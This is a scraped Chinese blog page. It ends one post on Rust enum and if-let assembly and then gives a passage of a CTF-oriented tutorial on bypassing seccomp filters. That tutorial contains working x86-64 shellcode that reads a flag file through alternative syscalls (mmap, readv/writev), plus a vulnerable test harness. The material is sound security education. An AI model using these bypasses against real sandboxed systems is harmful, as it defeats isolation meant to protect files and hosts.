<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 32], rdi</span><br><span class="line">call    rax</span><br><span class="line">mov     rsi, qword ptr [rsp + 32]</span><br><span class="line">lea     rdi, [rsp + 192]</span><br><span class="line">call    example::Student::test</span><br><span class="line">jmp     .LBB26_3</span><br></pre></td></tr></table></figure>
<p>可以看到方法的第一个参数依然是<code>self</code>，第二个参数则是等待初始化的<code>String</code>实例地址。在代码中是返回<code>String</code>实例，实际上是传入未初始化的指针。</p>
<h2 id="optiont"><a class="markdownIt-Anchor" href="#optiont"></a> <code>Option&lt;T&gt;</code></h2>
<p>针对<code>Option&lt;T&gt;</code>，Rust在汇编层有自己的处理方式。如果将<code>Option&lt;T&gt;</code>看做一个普通的枚举类型，且<code>Some</code>后面带的是另一个枚举类型，那么这样的话就会产生两层枚举对象，不太优雅。对于<code>get_student</code>函数，下面是部分反编译结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000009702 48 89 4C 24 18                mov     [rsp+108h+var_F0], rcx</span><br><span class="line">.text:0000000000009707 83 E8 03                      sub     eax, 3</span><br><span class="line">.text:000000000000970A 77 15                         ja      short def_971F                  ; jumptable 000000000000971F default case</span><br><span class="line">.text:000000000000970A</span><br><span class="line">.text:000000000000970C 48 8B 44 24 18                mov     rax, [rsp+108h+var_F0]</span><br><span class="line">.text:0000000000009711 48 8D 0D B4 09 04 00          lea     rcx, jpt_971F</span><br><span class="line">.text:0000000000009718 48 63 04 81                   movsxd  rax, ds:(jpt_971F - 4A0CCh)[rcx+rax*4]</span><br><span class="line">.text:000000000000971C 48 01 C8                      add     rax, rcx</span><br><span class="line">.text:000000000000971F FF E0                         jmp     rax                             ; switch jump</span><br><span class="line">.text:000000000000971F</span><br><span class="line">.text:0000000000009721                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000009721</span><br><span class="line">.text:0000000000009721                               def_971F:                               ; CODE XREF: revlab::get_student::h5c77d454e35cea03+3A↑j</span><br><span class="line">.text:0000000000009721 48 8B 44 24 08                mov     rax, [rsp+108h+var_100]         ; jumptable 000000000000971F default case</span><br><span class="line">.text:0000000000009726 48 C7 00 04 00 00 00          mov     qword ptr [rax], 4</span><br><span class="line">.text:000000000000972D E9 43 02 00 00                jmp     loc_9975</span><br></pre></td></tr></table></figure>
<p>下面的<code>def_971F</code>为默认分支，可以看到这里是将枚举类型的索引值赋值为4，但上面定义的枚举类型一共只有4个值，最大的索引值只能为3。将索引值设置为4实际上也就表示这个枚举类型是一个无效值，这样在内存中实际上并不存在二重枚举类型，而是只有一个<code>Student</code>枚举类型。由此可见，对泛型参数为枚举类型的<code>Option</code>，Rust进行了优化。</p>
<h1 id="reverse-for-if-let"><a class="markdownIt-Anchor" href="#reverse-for-if-let"></a> Reverse for if-let</h1>
<p>if let语句是针对只有一个处理条件和一个默认条件的<code>match</code>语句的平替。由于只有一个特殊条件和默认条件，因此在实际实现中只需要使用类似于if的逻辑即可完成。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(y)) = x &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 216</span><br><span class="line">        mov     byte ptr [rsp + 183], 0</span><br><span class="line">        lea     rdi, [rsp + 56]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        mov     edx, 5</span><br><span class="line">        call    &lt;str as alloc::string::ToString&gt;::to_string</span><br><span class="line">        lea     rdi, [rsp + 24]</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        lea     rdx, [rsp + 56]</span><br><span class="line">        call    qword ptr [rip + example::get_student@GOTPCREL]</span><br><span class="line">        mov     byte ptr [rsp + 183], 1</span><br><span class="line">        mov     eax, 1</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        cmp     qword ptr [rsp + 24], 4</span><br><span class="line">        cmove   rax, rcx</span><br><span class="line">        cmp     rax, 1</span><br><span class="line">        jne     .LBB18_2</span><br><span class="line">        cmp     qword ptr [rsp + 24], 3</span><br><span class="line">        je      .LBB18_3</span><br></pre></td></tr></table></figure>
<p>可以发现，这里的判断逻辑和<code>match</code>是类似的，都是对枚举索引值进行比较。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文学习了：</p>
<ol>
<li>Rust 结构体的内存排布以及结构体方法的参数传递，结构体方法参数传递遵照this参数传递法</li>
<li>Rust 枚举类型方法的参数传递与结构体方法的参数传递类似</li>
<li>Rust if-let语句的判断逻辑，<code>Option&lt;T&gt;</code>的内存结构</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/31/seccomp%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/31/seccomp%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">seccomp学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-31 09:59:09" itemprop="dateCreated datePublished" datetime="2023-10-31T09:59:09+08:00">2023-10-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-15 22:06:24" itemprop="dateModified" datetime="2023-11-15T22:06:24+08:00">2023-11-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>7.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本文中，我们来讨论一下近年来针对seccomp的绕过姿势。本文仅讨论x86-64平台。（来货了来货了）</p>
<h1 id="0x01-execve"><a class="markdownIt-Anchor" href="#0x01-execve"></a> 0x01. execve</h1>
<p>这个是最为简单的一类题型，不能直接获得shell，但是可以通过open、read、write三个系统调用将flag文件首先保存到内存之中再输出到控制台。</p>
<p>下面的代码是在内存中不存在&quot;./flag&quot;字符串的情况下绕过execve的orw shellcode：</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sys_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *filename, <span class="type">int</span> flags, <span class="type">umode_t</span> mode)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">sys_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">sys_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
<p>这里对于<code>read</code>和<code>write</code>函数的参数都不需要解释，对于<code>open</code>函数，<code>flags</code>参数表示以何种方式打开文件，0为只读，当<code>open</code>没有创建文件时，<code>mode</code>参数会被忽略，不过最好还是也传入0。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* read size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_read</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* write size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h1 id="0x02-execve-read"><a class="markdownIt-Anchor" href="#0x02-execve-read"></a> 0x02. execve + read</h1>
<p>如果题目禁用了<code>read</code>系统调用，但没有禁用<code>open</code>，则可以通过<code>mmap</code>的系统调用将文件内容映射到内存中，再<code>write</code>。</p>
<p>需要注意的是，对于Linux系统调用，6个参数的传递寄存器分别为<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>。与Glibc的传参有所不同。</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">long</span> <span class="title function_">sys_mmap</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">off_t</span> pgoff)</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 0x10000</span><br><span class="line">mov rsi, 0x1000</span><br><span class="line">mov rdx, 7</span><br><span class="line">push 0x12</span><br><span class="line">pop r10</span><br><span class="line">push 0x3</span><br><span class="line">pop r8</span><br><span class="line">xor r9, r9</span><br><span class="line">push SYS_mmap</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* write size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, 0x10000</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>注意，内核的<code>mmap</code>函数的<code>flag</code>参数和glibc的不太一样，0x10表示映射文件<code>MAP_FILE</code>，0x2表示私有映射<code>MAP_PRIVATE</code>，0x20表示匿名映射<code>MAP_ANONYMOUS</code>。这里需要使用<code>MAP_FILE | MAP_PRIVATE</code>才能完成映射。</p>
<p>上述代码可以成功攻击下面的C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* space = mmap((<span class="type">void</span>*)<span class="number">0x600000000000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	read(<span class="number">0</span>, space, <span class="number">0x1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">59</span>, <span class="number">2</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">	</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>))space)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-execve-read-write"><a class="markdownIt-Anchor" href="#0x03-execve-read-write"></a> 0x03. execve + read + write</h1>
<p>如果<code>read</code>和<code>write</code>都被禁用，我们又应该如何应对呢？不要急，这里给出最新版本Linux系统调用的64位系统调用号：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl">传送门</a></p>
<p>通过<code>pwn constgrep -c amd64 -m ^SYS</code>命令可以查看pwntools预先定义的所有32位与64位的系统调用号符号，这些符号可以用于pwntools脚本的汇编语言字符串中。</p>
<p>我们可以发现，系统调用表中还有<code>pread</code>、<code>pwrite</code>等似乎也可以进行读写的函数。下面就来详细分析一下这些系统调用：</p>
<h2 id="a-sys_pread64-nr17"><a class="markdownIt-Anchor" href="#a-sys_pread64-nr17"></a> A. sys_pread64 (nr=17)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pread</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> pos)</span>;</span><br></pre></td></tr></table></figure>
<p>该函数与<code>read</code>函数类似，但参数有4个，第4个为开始读的偏移位置，且使用<code>sys_pread64</code>函数读取完成后，文件指针不会改变。</p>
<h2 id="b-sys_pwrite64-nr18-不可用"><a class="markdownIt-Anchor" href="#b-sys_pwrite64-nr18-不可用"></a> B. sys_pwrite64 (nr=18, 不可用)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwrite</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> pos)</span>;</span><br></pre></td></tr></table></figure>
<p><code>sys_write64</code>与<code>sys_read64</code>类似，函数写操作完成后，文件指针不会改变。但是对于写操作而言，标准输出不是普通的文件描述符，可以看做一个字符设备，指定<code>pos</code>时写操作会失败。已经经过试验测试得出，<code>sys_write64</code>不能将内存中的内容输出到控制台中。</p>
<h2 id="c-sys_readv-nr19"><a class="markdownIt-Anchor" href="#c-sys_readv-nr19"></a> C. sys_readv (nr=19)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure>
<p><code>readv</code>函数实现了分散输入的功能，即将可以将一个文件描述符的内容写到多个内存缓冲区中。注意这里的“写入到多个内存缓冲区”指的是依次写入，第1个缓冲区写满之后才会接着文件后面的内容继续写第2个缓冲区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> __user* iov_base;</span><br><span class="line">    <span class="type">__kernel_size_t</span> iov_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>vec</code>参数应该是<code>struct iovec</code>结构体的数组，而第三个参数<code>vlen</code>为数组的长度。<code>iovec</code>结构体中，<code>iov_base</code>为一个内存地址，<code>iov_len</code>为内存的长度。因此如果需要使用这个系统调用，需要首先构造<code>iovec</code>结构体实例。在pwn题中，我们只需要构造一个结构体实例即可。</p>
<h2 id="d-sys_writev-nr20"><a class="markdownIt-Anchor" href="#d-sys_writev-nr20"></a> D. sys_writev (nr=20)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure>
<p><code>writev</code>函数实现了集中输出的功能，即将<code>iovec</code>结构体数组中的缓冲区内容集中输出到一个文件描述符中。</p>
<p>下面为使用<code>readv</code>函数和<code>writev</code>函数的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1    /* iov size */</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp-8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_readv</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1    /* iov size */</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp+8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_writev</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h2 id="e-sys_preadv-nr295"><a class="markdownIt-Anchor" href="#e-sys_preadv-nr295"></a> E. sys_preadv (nr=295)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                   <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数同时具有<code>pread</code>函数和<code>readv</code>函数的性质，使用<code>iovec*</code>结构体可完成分散输入，同时可设置偏移量且读取后不修改文件指针。其中<code>pos_l</code>指的是读取偏移的低32位，<code>pos_h</code>为高32位。</p>
<h2 id="f-sys_pwritev-nr296-不可用"><a class="markdownIt-Anchor" href="#f-sys_pwritev-nr296-不可用"></a> F. sys_pwritev (nr=296, 不可用)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                   <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数同时具有<code>pwrite</code>函数和<code>writev</code>函数的性质，这也意味着其无法向标准输出写入内容。</p>
<h2 id="g-sys_preadv2-nr327"><a class="markdownIt-Anchor" href="#g-sys_preadv2-nr327"></a> G. sys_preadv2 (nr=327)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数在参数上与<code>preadv</code>的区别是多了一个<code>flags</code>。这个<code>flags</code>的标志位主要针对一些效率、同步方面，直接填0即可。</p>
<h2 id="h-sys_pwritev2-nr328-不可用"><a class="markdownIt-Anchor" href="#h-sys_pwritev2-nr328-不可用"></a> H. sys_pwritev2 (nr=328, 不可用)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<p>对于上述系统调用，可以参考<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/preadv2.2.html">资料</a>进行学习。</p>
<h1 id="0x04-execve-open"><a class="markdownIt-Anchor" href="#0x04-execve-open"></a> 0x04. execve + open</h1>
<p>上述所有读写的系统调用都需要使用文件描述符，但如果禁用了<code>open</code>系统调用，又应该如何获取文件描述符呢？好在，还有其他的系统调用能够获取文件描述符。</p>
<h2 id="a-openat-nr257"><a class="markdownIt-Anchor" href="#a-openat-nr257"></a> A. openat (nr=257)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);</span><br></pre></td></tr></table></figure>
